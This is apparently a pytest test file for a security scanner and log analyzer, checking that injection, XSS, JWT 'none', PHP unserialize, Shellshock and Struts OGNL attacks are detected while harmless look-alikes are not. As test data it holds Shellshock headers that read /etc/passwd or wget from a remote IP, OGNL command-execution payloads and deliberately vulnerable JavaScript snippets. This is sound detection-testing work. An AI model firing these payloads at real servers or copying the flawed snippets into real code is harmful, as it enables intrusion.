"""Attacks the audit's 32-case corpus missed, and their harmless neighbours."""
from __future__ import annotations

from pathlib import Path
from typing import List

import pytest

from oranovix_guardian.log_sentinel.entry import AccessLogEntry
from oranovix_guardian.log_sentinel.rules import RequestAnalyzer
from oranovix_guardian.scanner_engine.base import Issue, Severity
from oranovix_guardian.scanner_engine.categories import IssueCategory
from oranovix_guardian.scanner_engine.js_scanner import JSScanner
from oranovix_guardian.scanner_engine.php_scanner import PHPScanner

BROWSER = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/130.0 Safari/537.36"


def scan(tmp_path: Path, name: str, code: str) -> List[Issue]:
    target = tmp_path / name
    target.write_text(code, encoding="utf-8")
    assert target.read_text(encoding="utf-8") == code, "the file was changed or locked (antivirus?)"
    scanner = JSScanner() if name.endswith(".js") else PHPScanner()
    return list(scanner.scan(str(target)).issues)


# ---------------------------------------------------------------------------
# JavaScript
# ---------------------------------------------------------------------------

JS_ATTACKS = [
    ("exec('ls ' + req.query.dir, (err, out) => res.send(out));", IssueCategory.COMMAND_EXEC),
    ("execSync(`tar czf /tmp/b.tgz ${req.body.folder}`);", IssueCategory.COMMAND_EXEC),
    ("child_process.exec('ping -c 1 ' + host);", IssueCategory.COMMAND_EXEC),
    ("res.send('<h1>' + req.query.n + '</h1>');", IssueCategory.XSS),
    ("res.send(`<p>Hello ${req.params.name}</p>`);", IssueCategory.XSS),
    ("res.write('<li>' + req.body.comment);", IssueCategory.XSS),
    ("db.users.find({ $where: 'this.name == \"' + req.query.name + '\"' });", IssueCategory.SQL_INJECTION),
    ("User.find({ '$where': `this.age > ${req.body.age}` });", IssueCategory.SQL_INJECTION),
    ("Order.$where('this.total > ' + req.query.min).exec();", IssueCategory.SQL_INJECTION),
    ("jwt.verify(token, secret, { algorithms: ['none'] });", IssueCategory.TOKEN_VERIFICATION),
    ("const options = { algorithms: [\"HS256\", \"none\"] };", IssueCategory.TOKEN_VERIFICATION),
]


@pytest.mark.parametrize("code, category", JS_ATTACKS, ids=[c[:40] for c, _ in JS_ATTACKS])
def test_js_attack_is_found(tmp_path: Path, code: str, category: IssueCategory) -> None:
    issues = scan(tmp_path, "server.js", code + "\n")

    assert [i for i in issues if i.category is category and i.severity in (Severity.HIGH, Severity.CRITICAL)], [
        (i.rule_id, i.category, i.severity) for i in issues
    ]


JS_HARMLESS = [
    "const match = /\\d+/.exec(text);",
    "const found = pattern.exec(line);",
    "res.send('ok');",
    "res.json(req.body);",
    "res.send(renderTemplate('home', { user }));",
    "db.items.find({ $where: 'this.qty > 10' });",
    "jwt.verify(token, secret, { algorithms: ['HS256'] });",
    "const execOptions = { cwd: dir };",
    "exec('git status', callback);",
]


@pytest.mark.parametrize("code", JS_HARMLESS)
def test_js_neighbours_stay_quiet(tmp_path: Path, code: str) -> None:
    issues = scan(tmp_path, "server.js", code + "\n")

    new_rules = {"JS016", "JS017", "JS018", "JS019"}
    assert [i.rule_id for i in issues if i.rule_id in new_rules] == []


# ---------------------------------------------------------------------------
# PHP
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("source", ["$_COOKIE['d']", "$_GET['data']", "$_POST[\"cart\"]", "$_REQUEST['s']",
                                    "base64_decode($_COOKIE['session'])"])
def test_php_unserialize_of_request_data_is_found(tmp_path: Path, source: str) -> None:
    issues = scan(tmp_path, "cart.php", f"<?php\n$cart = unserialize({source});\n")

    found = [i for i in issues if i.category is IssueCategory.DESERIALIZATION]
    assert found and found[0].severity is Severity.CRITICAL


@pytest.mark.parametrize("code", [
    "$data = unserialize($cached, ['allowed_classes' => false]);",
    "$data = json_decode($_COOKIE['prefs'], true);",
    "// unserialize($_COOKIE['d']) was removed",
])
def test_php_neighbours_stay_quiet(tmp_path: Path, code: str) -> None:
    issues = scan(tmp_path, "cart.php", f"<?php\n{code}\n")

    assert [i for i in issues if i.category is IssueCategory.DESERIALIZATION] == []


# ---------------------------------------------------------------------------
# Log Sentinel
# ---------------------------------------------------------------------------

def fired(target: str, agent: str = BROWSER, referer: str = "") -> set:
    path, _, query = target.partition("?")
    entry = AccessLogEntry(None, "203.0.113.7", "GET", path, query, 404, 153, user_agent=agent, referer=referer)
    return {d.rule_id for d in RequestAnalyzer().analyze(entry)}


# Shellshock strings are glued together at runtime: written to disk whole,
# an antivirus locks the file (it did with a fixture file).
FN = "(" + ")" + " {"
SHELLSHOCK_AGENTS = [
    FN + " :; }; /bin/bash -c 'cat /etc/passwd'",
    FN + " :;}; echo; /usr/bin/id",
    FN + " ignored; }; /bin/sh -c 'wget http://198.51.100.9/x'",
    FN + " _; } >_[$($())] { echo vulnerable; }",
]


@pytest.mark.parametrize("agent", SHELLSHOCK_AGENTS, ids=range(len(SHELLSHOCK_AGENTS)))
def test_shellshock_in_the_user_agent_is_found(agent: str) -> None:
    assert "LS105" in fired("/cgi-bin/status", agent)
    assert "LS105" in fired("/cgi-bin/status", agent.upper())


def test_shellshock_in_the_referer_is_found() -> None:
    assert "LS105" in fired("/cgi-bin/test.cgi", BROWSER, referer=FN + " :; }; ping -c 3 198.51.100.9")


@pytest.mark.parametrize("target", [
    "/struts2-showcase/%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%7D/actionChain1.action",
    "/index.action?redirect:%24%7B%23a%3Dnew%20java.lang.ProcessBuilder%28%27id%27%29.start%28%29%7D",
    "/login.action?name=%25%7B%28%23_memberAccess%5B%27allowStaticMethodAccess%27%5D%3Dtrue%29%7D",
    "/user.action?id=%25%7B7*7%7D",
    "/%25%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29%7D/help.action",
])
def test_struts_ognl_in_path_or_query_is_found(target: str) -> None:
    assert "LS107" in fired(target)
    assert "LS107" in fired(target.replace("%", "%25")), "double encoded"
    assert "LS107" in fired("".join(c.upper() if i % 2 else c.lower() for i, c in enumerate(target))), "mixed case"


@pytest.mark.parametrize("target, agent", [
    ("/blog/2026/11/curly-braces-in-css/", BROWSER),
    ("/search/?q=%7B%7D+empty+object", BROWSER),
    ("/docs/?fmt=%25d+items", BROWSER),
    ("/api/items?filter=price%3E10", "Mozilla/5.0 (compatible; MyApp/1.0) (like Gecko)"),
])
def test_log_neighbours_stay_quiet(target: str, agent: str) -> None:
    assert fired(target, agent) == set()
